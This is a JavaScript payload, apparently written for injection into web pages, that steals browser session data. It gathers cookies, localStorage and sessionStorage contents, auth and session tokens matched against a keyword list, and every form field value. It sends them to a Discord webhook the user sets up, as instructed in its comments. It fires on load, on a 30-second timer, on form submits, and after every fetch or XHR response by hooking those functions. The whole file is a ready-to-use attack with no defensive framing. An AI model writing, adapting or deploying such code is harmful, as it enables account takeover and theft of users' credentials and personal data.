(() => {
  // replace with your Discord webhook URL (or any HTTP endpoint that accepts POST)
  // create: Discord channel → Edit Channel → Integrations → Webhooks → New Webhook → Copy URL
  const EXFIL = "https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN";

  const TARGET_KEYS = [
    "token", "auth", "session", "jwt", "access_token", "refresh_token",
    "sid", "ssid", "PHPSESSID", "JSESSIONID", "ASP.NET_SessionId",
    "csrf", "xsrf", "user", "uid", "account"
  ];

  function collect() {
    const data = {
      origin: location.origin,
      href: location.href,
      ua: navigator.userAgent,
      ts: Date.now(),
      cookies: document.cookie,
      localStorage: {},
      sessionStorage: {},
      tokens: {},
      forms: []
    };

    try {
      for (let i = 0; i < localStorage.length; i++) {
        const k = localStorage.key(i);
        data.localStorage[k] = localStorage.getItem(k);
      }
    } catch (_) {}

    try {
      for (let i = 0; i < sessionStorage.length; i++) {
        const k = sessionStorage.key(i);
        data.sessionStorage[k] = sessionStorage.getItem(k);
      }
    } catch (_) {}

    const all = { ...data.localStorage, ...data.sessionStorage };
    document.cookie.split(";").forEach(c => {
      const [k, ...v] = c.trim().split("=");
      if (k) all[k] = v.join("=");
    });
    for (const [k, v] of Object.entries(all)) {
      if (TARGET_KEYS.some(t => k.toLowerCase().includes(t))) {
        data.tokens[k] = v;
      }
    }

    document.querySelectorAll("form").forEach(f => {
      const entry = { action: f.action, method: f.method, fields: {} };
      f.querySelectorAll("input, textarea, select").forEach(el => {
        if (el.name || el.id) entry.fields[el.name || el.id] = el.value;
      });
      data.forms.push(entry);
    });

    return data;
  }

  function send(payload) {
    const body = JSON.stringify({
      content: "```json\n" + JSON.stringify(payload, null, 2).slice(0, 1900) + "\n```"
    });

    // beacon survives navigation/unload
    if (navigator.sendBeacon) {
      navigator.sendBeacon(EXFIL, new Blob([body], { type: "application/json" }));
    }

    fetch(EXFIL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body
    }).catch(() => {});
  }

  // immediate
  send(collect());

  window.addEventListener("storage", () => send(collect()));
  setInterval(() => send(collect()), 30_000);

  document.addEventListener("submit", () => {
    setTimeout(() => send(collect()), 50);
  }, true);

  const _fetch = window.fetch;
  window.fetch = function (...args) {
    return _fetch.apply(this, args).then(r => {
      send(collect());
      return r;
    });
  };
  const _open = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function (...args) {
    this.addEventListener("load", () => send(collect()));
    return _open.apply(this, args);
  };
})();